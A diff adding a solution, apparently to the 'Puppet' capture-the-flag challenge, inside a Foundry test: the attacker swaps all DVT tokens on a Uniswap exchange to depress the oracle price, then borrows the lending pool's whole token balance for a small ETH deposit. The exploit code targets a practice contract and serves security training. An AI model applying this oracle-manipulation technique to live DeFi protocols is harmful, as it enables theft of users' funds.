@@ -100,7 +100,23 @@ contract Puppet is Test {
         /**
          * EXPLOIT START *
          */
+        // calculate initial deposit required
+        uint256 initDepositRequired = puppetPool.calculateDepositRequired(POOL_INITIAL_TOKEN_BALANCE);
+        console.log("initDepositRequired:", initDepositRequired); // 200_000 ether
 
+        vm.startPrank(attacker);
+        // approve uniswapExchange to use our DVT tokens
+        dvt.approve(address(uniswapExchange), ATTACKER_INITIAL_TOKEN_BALANCE);
+
+        // swap ETH for DVT tokens so that DVT balance > ETH balance
+        uniswapExchange.tokenToEthSwapInput(dvt.balanceOf(attacker), 1, block.timestamp + 60);
+        // calculate deposit required after swap
+        uint256 depositRequired = puppetPool.calculateDepositRequired(POOL_INITIAL_TOKEN_BALANCE);
+        console.log("depositRequired:", depositRequired); // a little more than 19.66 ether
+
+        // borrow all of pool's balance
+        puppetPool.borrow{value: depositRequired}(POOL_INITIAL_TOKEN_BALANCE);
+        vm.stopPrank();
         /**
          * EXPLOIT END *
          */
